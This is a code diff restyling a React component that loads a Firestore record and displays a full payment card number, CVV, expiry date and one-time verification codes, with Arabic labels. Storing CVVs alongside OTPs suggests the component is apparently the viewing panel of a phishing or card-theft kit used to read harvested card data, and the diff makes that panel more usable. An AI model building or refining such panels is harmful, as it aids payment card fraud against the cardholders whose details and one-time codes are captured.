@@ -3,6 +3,9 @@
 import { useState, useEffect } from 'react'
 import { DocumentData, doc, getDoc } from 'firebase/firestore'
 import { db } from '@/lib/firestore'
+import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
+import { Badge } from "@/components/ui/badge"
+import { CreditCard, Calendar, Lock, CheckCircle } from 'lucide-react'
 
 interface CardData {
   id:string;
@@ -59,17 +62,34 @@ export function CardsByID({ id }: { id: string }) {
   }
 
   return (
-    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-      <span>رقم pref:{cards.prefix}</span>
-
-      <span>رقم البطاقه:{cards.cardNumber}</span>
-      
-      <span>cvv:{cards.cvc}</span>
-      <span>ٍشهر{cards.month}</span>
-      <span>سنه{cards.yaer}</span>
-      <span>: تحقق{cards.otp}</span>
-      <span>تحقق الكل: {cards.otpall}</span>
-      {/* Add more spans for other card fields as needed */}
+      <Card className="w-full max-w-3xl mx-auto">
+      <CardHeader>
+        <CardTitle className="text-2xl font-bold text-center">تفاصيل البطاقة</CardTitle>
+      </CardHeader>
+      <CardContent className="grid grid-cols-1 md:grid-cols-2 gap-6">
+        <div className="space-y-2">
+          <DetailItem icon={<CreditCard className="h-5 w-5" />} label="رقم البطاقة" value={`${cards.prefix} ${cards.cardNumber}`} />
+          <DetailItem icon={<Lock className="h-5 w-5" />} label="CVV" value={cards.pass} />
+        </div>
+        <div className="space-y-2">
+          <DetailItem icon={<Calendar className="h-5 w-5" />} label="تاريخ الانتهاء" value={`${cards.month}/${cards.yaer}`} />
+          <DetailItem icon={<CheckCircle className="h-5 w-5" />} label="رمز التحقق" value={cards.otp} />
+        </div>
+        <div className="col-span-full">
+          <Badge variant="secondary" className="text-lg py-1 px-3">
+            تحقق الكل: {cards.otpall}
+          </Badge>
+        </div>
+      </CardContent>
+    </Card>
+  )
+}
+function DetailItem({ icon, label, value }: { icon: React.ReactNode; label: string; value: string }) {
+  return (
+    <div className="flex items-center space-x-2 rtl:space-x-reverse">
+      {icon}
+      <span className="font-semibold">{label}:</span>
+      <span>{value}</span>
     </div>
   )
 }
